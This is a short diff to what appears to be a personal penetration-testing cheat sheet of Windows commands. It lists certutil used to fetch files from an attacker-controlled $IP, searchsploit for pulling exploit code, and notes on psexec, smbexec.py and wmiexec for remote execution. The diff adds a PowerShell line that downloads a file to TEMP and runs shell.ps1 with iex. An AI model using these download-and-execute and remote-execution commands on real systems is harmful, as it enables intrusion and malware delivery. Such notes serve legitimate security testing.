@@ -32,10 +32,11 @@ findstr /B /C "string" - grep basically
 certutil -urlcache -f http://$IP/$PATH_TO_FILE - wget basically
 searchsploit <keyword> - search for exploits here instead of google first lmao
 searchsploit -m $ID - gets exploit code/script from db
-winexe (remote commands on windows system from linux) and psexec (remote commands from windows)
-winexe needs SMB enabled thats why no need to mention port number
 icacls - ACL to files/directories
 where /R c:\windows bash.exe
+
+iwr -Uri "[file_url]" -OutFile "$env:TEMP\[file]"; 
+iex "$env:TEMP\shell.ps1"
 ```
 
 if psexec dont work, smbexec.py (half shell) or wmiexec
